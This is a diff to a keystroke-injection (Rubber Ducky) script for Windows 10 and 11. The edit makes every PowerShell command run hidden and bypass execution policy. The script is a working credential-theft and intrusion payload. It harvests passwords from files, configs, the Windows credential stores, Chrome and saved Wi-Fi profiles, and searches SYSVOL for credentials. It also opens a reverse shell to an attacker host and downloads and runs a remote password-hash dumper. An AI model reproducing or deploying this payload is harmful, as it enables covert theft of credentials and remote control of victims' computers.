@@ -9,19 +9,19 @@ REM     Target: Windows 10, 11
 DELAY 1000
 GUI r
 REM 	Find pattern 'password' in files
-STRING powershell -c "& gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password""
+STRING powershell -w h -NoP -Ep Bypass -command "& gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password""
 ENTER
 DELAY 200
 REM 	Find database credentials in config files
-STRING powershell -c "gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString""
+STRING powershell -w h -NoP -Ep Bypass -command "gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString""
 ENTER
 DELAY 200
 REM 	Locate web server config files
-STRING powershell -c "gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue"
+STRING powershell -w h -NoP -Ep Bypass -command "gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue"
 ENTER
 DELAY 200
 REM  	
-STRING powershell -c "& {$client = New-Object System.Net.Sockets.TCPClient('attacker-host',attacker-port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }"
+STRING powershell -w h -NoP -Ep Bypass -command "& {$client = New-Object System.Net.Sockets.TCPClient('attacker-host',attacker-port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }"
 ENTER
 DELAY 200
 REM 	Get stored passwords from Windows PasswordVault
@@ -29,23 +29,23 @@ STRING powershell -ExecutionPolicy Bypass -windowstyle hidden -noninteractive -c
 ENTER
 DELAY 200
 REM 	Get stored passwords from Windows Credential Manager
-STRING powershell -c "& Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
+STRING powershell -w h -NoP -Ep Bypass -command "& Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
 ENTER
 DELAY 200
 REM 	Dump passwords from Google Chrome browser
-STRING powershell -c "& [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))"
+STRING powershell -w h -NoP -Ep Bypass -command "& [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))"
 ENTER
 DELAY 200
 REM 	Get Wi-Fi passwords
-STRING powershell -c "(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize"
+STRING powershell -w h -NoP -Ep Bypass -command "(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize"
 ENTER
 REM 	Credentials in SYSVOL and Group Policy Preferences (GPP)
-STRING powershell -c "Push-Location \\\\example.com\sysvol
+STRING powershell -w h -NoP -Ep Bypass -command "Push-Location \\\\example.com\sysvol
 gci * -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | select-string password
 Pop-Location"
 ENTER
 DELAY 200
 REM 	Dump local password hashes
-STRING powershell -c "iex(iwr("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"));Get-PassHashes"
+STRING powershell -w h -NoP -Ep Bypass -command "iex(iwr("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"));Get-PassHashes"
 ENTER
 
